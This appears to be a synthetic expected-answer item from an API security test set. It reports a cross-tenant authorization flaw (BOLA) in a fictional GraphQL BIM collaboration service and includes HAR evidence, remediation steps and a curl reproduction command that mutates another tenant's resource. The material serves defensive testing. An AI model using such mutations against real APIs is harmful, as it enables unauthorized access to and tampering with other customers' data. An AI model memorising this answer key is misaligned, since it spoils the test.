# Expected Response

## System
- **Domain:** Construction / BIM Collaboration
- **System:** BuildCore BIM Collaboration
- **Example ID:** GQL-0178

## Priority Findings

### Finding 1: Construction BIM — BOLA via updateResource Linked Resource Exposes Cross-Tenant Project Data (Pattern 1.2)
**Severity:** High
**Category:** BOLA / Related or Linked Resources

**Summary:**
Per §4.0 (RISK-GQL-178): The `getResource` resolver fetches by `resourceId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 1.2 — related or linked resources): the `updateResource` mutation traverses linked BIM model objects without checking ownership of the parent resource's tenant. An attacker from `tenant-a80d` submitted `updateResource(id: "R-2178", input: {status: "approved", ownerId: "attacker-a80d8609"})` against a BIM resource belonging to `tenant-8609`, receiving `CONFIDENTIAL-a80d8609`. In Construction / BIM Collaboration, unauthorized mutation of building model data can compromise structural integrity records, regulatory submissions, and project delivery timelines.

**Evidence from HAR:**
- Request: `POST https://api.buildcore-bim-collab.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-a80d`
- Mutation: `updateResource(id: "R-2178", input: {status: "approved", ownerId: "attacker-a80d8609"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-8609"`, `ownerId: "other-user-a80d8609"`, `sensitiveField: "CONFIDENTIAL-a80d8609"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-a80d8609`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-178 | getResource resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 1.2 | Related/linked resource traversal without ownership check |
| HAR mutation | input.ownerId | attacker-a80d8609 (client-injected) |
| HAR response | tenantId | tenant-8609 returned to tenant-a80d |
| HAR response | sensitiveField | CONFIDENTIAL-a80d8609 |
| HAR header | x-request-id | req-a80d8609 |

## Steps to Reproduce

### Step 1 — updateResource linked resource BOLA (HAR)
```bash
curl -s -X POST https://api.buildcore-bim-collab.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-a80d" \
  -d '{"query": "mutation { updateResource(id: \"R-2178\", input: {status: \"approved\", ownerId: \"attacker-a80d8609\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-8609` BIM resource mutated, returns `CONFIDENTIAL-a80d8609`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput` — derive from JWT only.
3. Validate all linked/related resources share the caller's `tenantId` before mutation.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
